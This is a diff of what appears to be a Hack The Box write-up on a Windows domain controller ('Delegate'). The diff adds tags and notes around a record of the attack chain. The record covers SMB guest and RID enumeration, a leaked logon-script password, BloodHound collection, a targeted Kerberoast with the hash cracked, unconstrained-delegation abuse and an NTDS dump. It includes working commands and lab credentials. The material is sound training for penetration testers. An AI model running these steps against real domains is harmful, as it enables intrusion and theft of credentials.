@@ -7,7 +7,15 @@ TocOpen: true
 tags:
   - blog
   - HTB
-lastmod: 2026-04-26T15:13:10.857Z
+  - windows
+  - Port53-DNS-Discovery-Host
+  - Port139-135-SMB-anonymous-login
+  - Port139-135-SMB-enumerating
+  - Lateral-Movement-account-verify-nxc
+  - Bloodhound-Collect-nxc
+  - Bloodhound-vectory-GenericWrite
+  - Windows-Privilege-SeEnableDelegationPrivilege
+lastmod: 2026-05-07T06:21:22.641Z
 ---
 # Box Info
 
@@ -17,9 +25,7 @@ lastmod: 2026-04-26T15:13:10.857Z
 
 # Recon
 
-### \[\[PORT & IP SCAN]]
-
-The `nmap` reveal that the machine is ((change it) a standard Windows AD Server , with the kerberos auth , also the ldap query , and the 3389 port show that the domain `AWSJPDC0522.shibuya.vl` ,but the ldap anonymous inquiry failed .)
+### PORT & IP SCAN
 
 ```
 ──(parallels㉿kali-linux-2025-2)-[~/Desktop]
@@ -91,6 +97,14 @@ Nmap done: 1 IP address (1 host up) scanned in 101.54 seconds
 
 ### Port 53 DNS
 
+{{< toggle "Tag 🏷️" >}}
+
+{{< tag "Port53-DNS-Discovery-Host" >}} The box shows many of the ports associated with a [Windows Domain Controller](https://0xdf.gitlab.io/cheatsheets/os#windows-domain-controller). The domain is `delegate.vl`, and the hostname is `DC1`.
+
+I’ll use `netexec` to make a `hosts` file entry and put it at the top of my `/etc/hosts` file:
+
+{{< /toggle >}}
+
 ```
 ┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
 └─$ nxc smb 10.129.234.69  --generate-hosts-file  hosts
@@ -112,7 +126,11 @@ ff02::2 ip6-allrouters\
 
 ### SMB
 
-allow the guest login
+{{< toggle "Tag 🏷️" >}}
+
+{{< tag "Port139-135-SMB-anonymous-login" >}} The guest authentication is not enough to list users just by asking for users, but I am able to do a RID cycle (bruteforce) attack:
+
+{{< /toggle >}}
 
 ```
 ┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
@@ -130,32 +148,13 @@ SMB         10.129.234.69   445    DC1              SYSVOL          READ        
 
 ```
 
-spider all
+{{< toggle "Tag 🏷️" >}}
+
+{{< tag "Port139-135-SMB-enumerating-spider " >}} Using the --spider model of netexec to quickly view all file
+
+{{< /toggle >}}
 
 ```
-
-                                                                                                                                                                                                                                           
-┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
-└─$  nxc smb 10.129.234.69   -u 'guest' -p '' --shares
-SMB         10.129.234.69   445    DC1              [*] Windows Server 2022 Build 20348 x64 (name:DC1) (domain:delegate.vl) (signing:True) (SMBv1:None) (Null Auth:True)
-SMB         10.129.234.69   445    DC1              [+] delegate.vl\guest: 
-SMB         10.129.234.69   445    DC1              [*] Enumerated shares
-SMB         10.129.234.69   445    DC1              Share           Permissions     Remark
-SMB         10.129.234.69   445    DC1              -----           -----------     ------
-SMB         10.129.234.69   445    DC1              ADMIN$                          Remote Admin
-SMB         10.129.234.69   445    DC1              C$                              Default share
-SMB         10.129.234.69   445    DC1              IPC$            READ            Remote IPC
-SMB         10.129.234.69   445    DC1              NETLOGON        READ            Logon server share 
-SMB         10.129.234.69   445    DC1              SYSVOL          READ            Logon server share 
-                                                                                                                                                                                                                                           
-┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
-└─$  nxc smb 10.129.234.69   -u 'guest' -p '' --shares SYSVOL
-SMB         10.129.234.69   445    DC1              [*] Windows Server 2022 Build 20348 x64 (name:DC1) (domain:delegate.vl) (signing:True) (SMBv1:None) (Null Auth:True)
-SMB         10.129.234.69   445    DC1              [+] delegate.vl\guest: 
-SMB         10.129.234.69   445    DC1              [*] Enumerated shares
-SMB         10.129.234.69   445    DC1              Share           Permissions     Remark
-SMB         10.129.234.69   445    DC1              -----           -----------     ------
-                                                                                                                                                                                                                                           
 ┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
 └─$  netexec smb 10.129.234.69    -u 'guest' -p ''   --spider 'IPC$' --regex .
 SMB         10.129.234.69   445    DC1              [*] Windows Server 2022 Build 20348 x64 (name:DC1) (domain:delegate.vl) (signing:True) (SMBv1:None) (Null Auth:True)
@@ -275,8 +274,6 @@ SMB         10.129.234.69   445    DC1              //10.129.234.69/SYSVOL/deleg
                                                                                                                                                           
 ```
 
-rid is also success
-
 ```
 ┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
 └─$  netexec smb 10.129.234.69    -u 'guest' -p '' --rid-brute  
@@ -362,11 +359,11 @@ net use v: \\dc1\development
 if %USERNAME%==A.Briggs net use h: \\fileserver\backups /user:Administrator P4ssw0rd1#123      
 ```
 
-```
-for proto in smb winrm wmi rdp ssh ldap; do echo -e "\n[*] Testing $proto..." && netexec $proto dc1.delegate.vl -u 'A.Briggs' -p 'P4ssw0rd1#123'; done
-```
+{{< toggle "Tag 🏷️" >}}
 
-if no pwd! mean that It doesn’t work over WinRM or RDP (the plus means the creds are good, but lack of `pwned!` means permissions to RDP are not there):
+{{< tag "Lateral-Movement-account-verify-nxc" >}} if no pwd! mean that It doesn’t work over WinRM or RDP (the plus means the creds are good, but lack of `pwned!` means permissions to RDP are not there):(Why)。
+
+{{< /toggle >}}
 
 ```
 ┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
@@ -398,6 +395,12 @@ LDAP        10.129.234.69   389    DC1              [+] delegate.vl\A.Briggs:P4s
                                                                                                                                                                             
 ```
 
+{{< toggle "Tag 🏷️" >}}
+
+{{< tag "Bloodhound-Collect-nxc" >}} I’ll use auth as A.Briggs to collect BloodHound data. I like to collect with both `netexec`:
+
+{{< /toggle >}}
+
 ```
 ┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
 └─$ netexec ldap dc1.delegate.vl -u A.Briggs -p 'P4ssw0rd1#123' --bloodhound -c All --dns-server 10.129.234.69
@@ -412,9 +415,11 @@ LDAP        10.129.234.69   389    DC1              Compressing output into /hom
 choose the `Shortest paths from Owned objects`\
 ![Pasted image 20260426163917.png](/ob/Pasted%20image%2020260426163917.png)
 
-```
-bloodyAD --host DC1.delegate.vl -d delegate.vl -u A.Briggs -p 'P4ssw0rd1#123' add groupMember "Lansweeper Admins" svc_inventory_lnx
-```
+{{< toggle "Tag 🏷️" >}}
+
+{{< tag "Bloodhound-vectory-GenericWrite" >}} This user has one Outbound Object Control, which I’ll select. It’s `GenericWrite` over N.Thompson,With GenericWrite over an account, there are a couple of potential vectors to take over the account. One is a shadow credential, but I wasn’t able to get that to work here. The other is a targeted Kerberoast attack. I’ve shown this attack a couple times before on
+
+{{< /toggle >}}
 
 ```
 ┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
@@ -450,6 +455,10 @@ $krb5tgs$23$*N.Thompson$DELEGATE.VL$delegate.vl/N.Thompson*$10c9a799364d14b03fa5
 
 ```
 
+### Crack
+
+I’ll save that hash to a file and pass it to `hashcat`:
+
 ```
 $ hashcat N.Thompson.hash /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
 hashcat (v6.2.6) starting in autodetect mode
@@ -462,6 +471,8 @@ The following mode was auto-detected as the only one matching your input hash:
 $krb5tgs$23$*N.Thompson$DELEGATE.VL$delegate.vl/N.Thompson*$1e386cc3c902da2a37ca7fb709f240e7$683a72d4bce12eb20a3bc1345ded9b27c75a471647b1b6c9962a51d4cbbe4230c8f5940e263e36a4cc22ce83e148b2f20a6665bafbd94f26c1c0a27ef81194d1d520bad1a3d5b61688b49f3c8033449f3331c90013992859efcf95425623d37d23d9ddd315657c9cf4322c51ae53b0f458305d3056e2b1d1fa20e859ad89f18a82f0c31d47d7e61182644d02c19a7efff1b2167c801d955e9dd62987a9029f372083c97feffee76ad1b4e11a93f152e7f56037cf6e5dc797a5b73f980856ffad74edeaaa16da87ea7bdfd0c8289714bd3d78964b1c5dbbfcab8a79bb2d797be3935f48130a9e417b9c06db0eaa0101e98030c68e4b4ddc275fb65f903e847fa45ab75343eb49bd5dfc4c480a6b1cbdd1c1bb2aac6fa49f9944d1ddf8c748c1426aff9588f6e93f5290fe1cf502318077d0c6aed0e3fc92a6dea115bf38b793a318481e9ef810b0b4a8ae076884eb81d54f8b3148eeabf927a3ce99012f6c6adf1a03280e066d708d3d8e4174987fbb2b2eccd46f6b3657c5914ef597c24039a726944247ca1c038a09afa3dd0c1ccb74b2d4b869c96640800060fd8e1c60f04401ab6c80af6c8327d991109c4c94680fc67c81eb4584bdac6682151425da4c6613f3f18483e1582f517e75d6ed89e0ee6914231f29e76b1c5826c64f0c26172ffa9b4c5dfb049ca98b7b09af6dbf851a0580e6b86c5d893e9715e1032bab03f1230e4813b15baa6424de688f176d2c6a42fe2977e160b61372389dbe6f695aa5d729d6dd1290fd25a867890ae0fb15eb6c5fe0925aea11bc328ec5156e0f4f53df4aee63958604a0df1c633fb4bfe425924edd726a788acdee4f9d331cdf4410c8c750a6bd541b9e71f3df58ebbdae9b573299f4e782adda09052f60873bc7bc390f41023532045b1d3e92df8d7fa439ee5ec399ae51f065dfcfbf2177ccee8fec0468cc709fcedefe93782ac4139603cf557529095459e12f7096bf2ce36593f092f66a1554c9aae57adeb8d9be701e05c82843cbcc981f56305e83d225e8b5d1f7f007f196db1f82997aea52247a58605d610302b6b28de432303957f72464eefbbb3efe71535104157e340b9869e5545c2624184dc69185922cd523ecbab905c2bd8e0035fa97f3a8ca14f0dbea7f7418e9c8220f697a3532cde2e30ab89e21c5a89868668619491a99ec4c9f5af16218c7b8f30fb86478442c8da1b63d659e6040321eaf5aeaa7423327cc084c8ec90c7ac39604d6a5258f5fbc87449ae9cd6fccb2f5ec834f0656636d12aca7f9c328301d2c9315b29ac932f04c088e4f7093d6e3780fd09763efe7fe9903a2034cdb7dcd0db477d4cfaeba80e3a0fbbe16d881e53fc6501f385a4a2c7c6bf6f81316c74b1dd881137b443235dd32f4d5479ab9f0db5190c55602dc2a3b4b5cee30ea3a861a2b4c7f71fcfb4fab1a4539550b8e97:KALEB_2341
 ...[snip]...
 ```
+
+It identifies the hash type and cracks it in about 14 seconds on my host.
 
 ```
 ┌──(parallels㉿kali-linux-2025-2)-[~/Desktop/targetedKerberoast]
@@ -499,6 +510,12 @@ C:\USERS
 
 ```
 
+{{< toggle "Tag 🏷️" >}}
+
+{{< tag "Windows-Privilege-SeEnableDelegationPrivilege" >}} I’ve got `SeEnableDelegationPrivilege`, which will allow me to configure both unconstrained and constrained delegation for the machine.Also,the MachineAccountQuota is 10 (the default), which means any user can add up to 10 computers to the domain.I’ll also note that LDAP signing is not enforced. These two prerequisites for abusing unconstrained delegation are met.
+
+{{< /toggle >}}
+
 ```
 evil-winrm-py PS C:\> whoami /priv
 
@@ -514,7 +531,11 @@ SeIncreaseWorkingSetPrivilege Increase a process working set                    
 
 ```
 
+### Setup Machine
+
 abuse the SeEnableDelegationPrivilege
+
+To abuse this, I’ll create a machine account and a DNS record for it. Then I’ll give it a SPN and set it up for unconstrained delegation. From there, I’ll coerce the DC to authenticate to the fake machine and capture a copy of the TGT which is only saved because of the unconstrained delegation.
 
 ```
 ┌──(parallels㉿kali-linux-2025-2)-[~/Desktop/targetedKerberoast]
@@ -526,7 +547,7 @@ MAQ         10.129.234.69   389    DC1              MachineAccountQuota: 10
                                                                              
 ```
 
-MachineAccountQuota is. 10 , so we can abuse it
+I’ll also note that LDAP signing is not enforced. These two prerequisites for abusing unconstrained delegation are met.
 
 I’ll be working with tools from [Impacket](https://github.com/SecureAuthCorp/impacket), [BloodyAD](https://github.com/CravateRouge/bloodyAD), and [krbrelayx](https://github.com/dirkjanm/krbrelayx). I’ll create my machine using `addcomputer.py`:
 
@@ -718,6 +739,8 @@ SMB         dc1.delegate.vl 445    DC1              [+] DELEGATE.VL\DC1$ from cc
                                                                                      
 ```
 
+### DCSync
+
 ```
 ┌──(parallels㉿kali-linux-2025-2)-[~/Desktop/krbrelayx]
 └─$ KRB5CCNAME=DC1\$@DELEGATE.VL_krbtgt@DELEGATE.VL.ccache netexec smb dc1.delegate.vl --use-kcache --ntds
@@ -740,6 +763,8 @@ SMB         dc1.delegate.vl 445    DC1              [*] To extract only enabled 
 SMB         dc1.delegate.vl 445    DC1              [*] grep -iv disabled /home/parallels/.nxc/logs/ntds/DC1_dc1.delegate.vl_2026-04-26_231155.ntds | cut -d ':' -f1
 
 ```
+
+### Shell
 
 ```
 ┌──(parallels㉿kali-linux-2025-2)-[~/Desktop/krbrelayx]
